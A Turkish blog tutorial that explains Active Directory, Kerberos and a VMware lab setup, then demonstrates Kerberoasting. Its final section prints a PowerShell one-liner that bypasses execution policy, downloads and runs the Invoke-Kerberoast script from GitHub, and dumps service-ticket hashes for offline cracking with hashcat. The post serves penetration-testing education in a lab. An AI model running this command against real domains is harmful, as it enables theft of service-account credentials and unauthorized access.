---
layout: post
title:  "[TR] Windows Active Directory Ortamı Nedir, Nasıl
Çalışır, Nasıl Saldırılabilir ?"
categories: security
---

# İçindekiler
- [İçindekiler](#i̇çindekiler)
  - [Giriş](#giriş)
  - [Tanım](#tanım)
  - [Active Directory'de Domainler](#active-directoryde-domainler)
  - [Active Directory'de Tree ve Forest](#active-directoryde-tree-ve-forest)
  - [Active Directory Domain Controller](#active-directory-domain-controller)
  - [Active Directory Database](#active-directory-database)
  - [LDAP](#ldap)
  - [Active Directory DNS](#active-directory-dns)
  - [Group Policy](#group-policy)
  - [Kerberos](#kerberos)
  - [Kerberos Kimlik Doğrulama Aşamaları](#kerberos-kimlik-doğrulama-aşamaları)
  - [Lab Kurulumu](#lab-kurulumu)
  - [1. Sanal Makine Oluşturma](#1-sanal-makine-oluşturma)
  - [2- İşletim Sistemi Kurulumu](#2--i̇şletim-sistemi-kurulumu)
  - [3- Statik IP Ataması](#3--statik-ip-ataması)
  - [4- Hostname Değiştirme](#4--hostname-değiştirme)
  - [5- Domain Controller Kurulumu](#5--domain-controller-kurulumu)
  - [6- Forest Ekleme](#6--forest-ekleme)
  - [7- Active Directory Ortamına Client Ekleme](#7--active-directory-ortamına-client-ekleme)
  - [DHCP server](#dhcp-server)
  - [DNS](#dns)
  - [Active Directory'de Trust](#active-directoryde-trust)
  - [Kerberoast](#kerberoast)
  - [Kaynakça ve İleri Okuma](#kaynakça-ve-i̇leri-okuma)


## Giriş
Herkese merhaba, bu yazı boyunca active directory dünyasına derinlemesine bir dalış yapacak, lab ortamımızı hazırlayacak
ve active directory ortamının nasıl çalıştığını ne gibi yapıtaşlarından oluştuğunu anlamaya çalışacağız.
Bunun haricinde bu alana sızma testi nasıl yapılır ve ne gibi teknikler kullanılabilir sorularına da yanıt aramaya çalışacağız.

## Tanım
Active directory, ağ üzerinde erişilmek veya paylaşılmak istenen veriyi hiyerarşik bir dizin yapısı ile yetkili kullanıcılara
sunan bir dizin sistemidir. Ağ üzerinden bu sisteme dahil cihazlar (yazıcılar,kullanıcı bilgisayarları, veritabanlar, vb.) ağ
üzerinde başka bir noktada erişilmek istenen kaynağa active directory sistemine dahil protokoller aracılığı ile yetkilendirilip kolay bir biçimde erişebilirler. Active directroy ortamı sistem yöneticilerinin işini de bir hayli kolaylaştırmaktadır. Bu ortama
dahil cihazlar, tek bir birimden (Domain Controller) güncellenebilir, yapılandırılabilir ve sürdürülebilirliği sağlanabilir.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.003.png)

## Active Directory'de Domainler
Active directory ortamı altına erişilebilen veriler, bir domain (alan adı) altında temsil edilirler. Domainler active directory
ortamı altında mantıksal bölümlendirmeleri temsil ederler. Active directory altındaki her domain domain her zaman
benzersiz bir isim yapısı ile temsil edilir. Ör : **prismacsi.local**

## Active Directory'de Tree ve Forest
Aynı domainden türetilmiş, active directory ortamına ait bir grup cihaza AD Tree denmektedir. Domainin temsil ettiği
cihazlar her zaman root domain ağacın en başında yer almak üzere bir hiyerarşi oluştururlar. Örneğin root domain
prismacsi.local ise ağacı oluşturan ve domainler tarafından temsil edilen diğer objeler bu domainden türeyeceklerdir.
Örneğin : **support.prismacsi.local** , **database.prismacsi.local** gibi.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.004.jpeg)

Ağaç hiyerarşisinden oluşan objelerin birbirlerine bağlanması ile **AD Forest** oluşmaktadır. Active directory ortamının var
olabilmesi için bir **Forest** oluşturulması şarttır. Bu işlemler lab kurulumunda uygulamalı olarak gösterilecektir.

## Active Directory Domain Controller
Active directory'de domain controller, kimlik doğrulaması işlemini gerçekleştiren servisleri (Ör : kerberos) host ederler.
Böylece sisteme dahil olmak isteyen her kullanıcı önce domain controller tarafına yönlendirilmektedir. Domain controller,
active directory ortamındaki kullanıcı ve bilgisayar hesaplarını yönetmek, konfigüre etmek işlemlerini yürütmek için sistem
yöneticileri tarafından kullanılır. Başka bir deyişle active directory ortamının komuta merkezidir.
Ör : **prismacsi.local** domainine dahil olmaya çalışan bir hesap:

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.005.png)


## Active Directory Database
Kullanıcı kimlikleri, active directory ortamına dahil bilgisayarlar, gruplar, servisler ve kaynaklar vb. active directory
veritabanında tutulurlar. Bu veritabanı **ntds.dit** adında tek bir dosyadan oluşur. Varsayılan olarak **C:\NTDS** dizininde saklanır.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.006.png)


## LDAP
LDAP açılımı : Lightweight Directroy Access Protocol , dizin sunucuları ile iletişime geçilmesini sağlayan bir protokoldür.
Genellikle kimlik doğrulama, kullanıcılar, gruplar ve uygulamalar hakkında veri depolamak için kullanılır. LDAP servisi ağ
üzerinde ne olduğunu takip etmek ve bu verileri sunmakla sorumludur.

## Active Directory DNS
Active directory'nin çalışması için DNS bir hayli önemlidir. Active directory ortamına dahil bir dns sunucusu bu ortama ait
domainlerin hangi cihazlarla eşleştiğini söylemektedir. Örneğin : **ankara.prismacsi.local** domainine gitmek isteyen ve active directory ortamına dahil kullanıcı bu domaine bağlanmak için istek yaptığı zaman, yine bu ortama dahil bir DNS sunucusu
bu isteği bir IP adresine çözmekte ve bağlantıyı mümkün kılmaktadır.

## Group Policy
Group Policy kullanıcı ve bilgisayar ayarlarını, bir grup kullanıcıya veya tek bir kullanıcıya göre tanımlamak için kullanılır.

## Kerberos
Kerberos, bir ağ kimlik doğrulaması protokolüdür. Sunucu/istemci uygulamalarının güvenli olmayan ağlar üzerinden, şifreli
ve güvenli bir kanal aracılığı ile kimlik doğrulaması yapmak amacı Massachusetts Institute of Technology tarafından
geliştirilmiştir. Kerberos protokolü güçlü bir kriptografik algortima kullanmaktadır, bu sayede istemci sunucuya ve sunucu
istemciye kimliklerini ispat edebilmektedir.

## Kerberos Kimlik Doğrulama Aşamaları
1. İstemci Key Distribution Center(KDC)'a bir kimlik doğrulama ticket'ı(bilet) TGT isteği yollar.
2. KDC bu isteği onaylar ve şifrelenmiş kimlik doğrulama ticket'ını(TGT) ve oturum anahtarını istemciye yollar
3. TGT Ticket Granting Service TGS gizli anahtarı ile şifrelenir.
4. İstemci TGT yi sisteminde tutar. TGT zaman aşımına uğradığında KDC'den yenisini ister.
Eğer istemci ağ üzerinde bir servise veya kaynağa ulaşmak istiyorsa adımlar şu şekilde olacaktır:
5. İstemci TGT'sini TGS ye ulaşmak istediği kaynağın Service Principal Name SPN numarası ile birlikte KDC ye yollar.
6. KDC istemciden gelen TGT yi onaylar ve kullanıcının kaynağa erişme yetkisi olup olmadığını kontrol eder.
7. TGS istemciye geçerli bir oturum anahtarı gönderir.
8. İstemci bu anahtarı erişmek istediği servise erişmek için yönlendirir ve servis erişim izni sağlar.
Kerberosa yönelik saldırı yöntemleri yazının ilerleyen kısımlarında bahsedilecektir.

## Lab Kurulumu
Active Directory saldırılarını simüle etmemiz için yeterli bir lab ortamı kuralım. Lab elemanları şu şekilde:
- Domain Controller : Windows Server 2012 R2
- İstemci : Windows 7, Windows 10

İndirme linkleri :
- <https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012-r2>
- <https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/>
- <https://www.virtualbox.org/wiki/Downloads>
Sanallaştırma programları olarak virtualbox veya vmware kullanılabilir. Ben bu yazıda vmware kullanacağım. İki
programında çalışma mantığı oldukça benzerdir.

## 1. Sanal Makine Oluşturma
**File → New Virtual Machine** seçeneğine tıklıyoruz
![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.007.png)

**→next**'e tıkladıktan sonra windows server iso dosyasını seçiyoruz.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.008.png)

## 2- İşletim Sistemi Kurulumu
35GB alan verip ağ bağlantısı olarak **Host only** seçip standart Windows kurulumundan devam ediyoruz.İşletim sistemimizde
grafik arayüzü bulunmasını istediğimizden aşağıdaki seçenekle devam ediyoruz.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.009.png)

## 3- Statik IP Ataması
Kurulum tamamlandığı zaman domain controller'ımız için statik bir IP adresi belirlememiz gerekiyor. Bunun için **windows+r → ncpa.cpl** yazıp çalıştırıyoruz.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.010.png)

## 4- Hostname Değiştirme
**windows+r → sysdm.cpl**

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.011.png)

## 5- Domain Controller Kurulumu
**→Add roles and features**

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.012.png)

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.013.png)

**→ Active Directroy Domain Services → DNS**

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.014.png)

Kurulum tamamlandığı zaman server management kısmından **→ promote this server to a domain controller.**

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.015.png)


## 6- Forest Ekleme
Root domain'i girip **→next**

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.015.png)

İlgili kurumlar tamamlandığında domain controller kurma işlemi tamamlanmış olacak.


## 7- Active Directory Ortamına Client Ekleme

Ağ adaptörü olarak **Host Only** seçilmiş bir Windows istemci ile, **windows+r →sysdm.cpl →run** ile istemcinin domain
controller ile haberleşebilmesi için statik ip atıyoruz, ayrıca tercih edilen DNS sunucusu kısmını domain controller'ın IP
adresi ile değiştiriyoruz.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.016.png)

Ardından **windows+r → ncpa.cpl** ile istemciye alakalı bir isim belirleyip, active directory ortamına domain controller
tarafından oluşturulmuş bir hesap ile dahil oluyoruz.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.017.png)

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.018.png)


## DHCP server
DHCP (Dynamic Host Configuration Protocol Server) kurularak, active directory ortamına dahil olan her cihaza manuel
olarak IP atama işleminden kurtulmamızı sağlar. Server Management -> Add roles and features -> DHCP seçenekleri DC'ye kurulabilir.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.019.png)

Kurulumdan sonra ilgili ayarlar **windows + r → dhcpmgmt.msc** ile yapılır.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.020.png)


## DNS
Dns servisini yükledikten sonra **windows+r → dnsmgmt.msc** ile açılan pencerede, yeni DNS kayıtları atanabilir, (ör : A,
CNAME,MX) veya load balance (yük dengeleme) işlemleri için AD içerisinde ikinci bir DNS sunucusu yaratılabilir.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.021.png)

## Active Directory'de Trust
Active directory ortamında trust ağ üzerindeki çeşitli kaynaklara, kullanıcılara, gruplara ve bilgisayarlara erişilmesini
mümkün kılar. Bu işlem iki domain arasında kimlik doğrulama ile gerçekleşir. İki adımlı bir süreçtir:
1. Trust sağlanır
2. İzinler atanır.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.022.png)
Trust işlemi sağlanırken önceden bahsettiğimiz kerberos kimlik doğrulama aşamalarından geçilir. İlerleyen kısımlarda
bahsedeceğimiz kerberoast isimli saldırı tipinde bu trust aşamasını hedef alıyor olacağız.

## Kerberoast
Kerberoasting, saldırganların active directory ortamındaki servis hesaplarınının kimlik bilgilerine offline bir şekilde brute
force yapabilmesidir. Bu saldırı legacy windows istemcilerinin active directory tarafından desteklenmesi, kerberos
ticketlarının şifrelenmesinde ve imzalanma türünden kaynaklanmaktadır. Bir kullanıcı spesifik bir kaynağı kullanmak istediği
zaman imzalı bir kerberos ticket'ı alırlar, imzalama işlemi ise o servisi yürüten hesabın NTLM hashi ile yapılır. Sorun da
buradan kaynaklanmaktadır.
Aşağıdaki komut ile bu durumu simüle etmek amacıyla bir kullanıcı ardından ise bir servis oluşturuyoruz.

(% highlight powershell %)

net user kullanici1 Passw0rd! /ADD /DOMAIN
setspn -s http/<domain>:80 kullanici1

(% endhighlight %)

ardından github üzerinden bu saldırıyı gerçekleştiren scripti indirip çalıştırıyoruz:

(% highlight powershell %)
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII hash.txt"
(% endhighlight %)

Elde edilen hash hashcat ile kırılabilir ve parola elde edilebilir.

![](/assets/images/Aspose.Words.c20b2ad4-4952-4636-b5d1-fe1c35aff6d2.023.png)

## Kaynakça ve İleri Okuma
- <https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domainservices-overview>
- <https://ldap.com/>
- <https://web.mit.edu/kerberos/>
- <https://www.varonis.com/blog/kerberos-authentication-explained/>
- <https://attack.mitre.org/techniques/T1558/003/>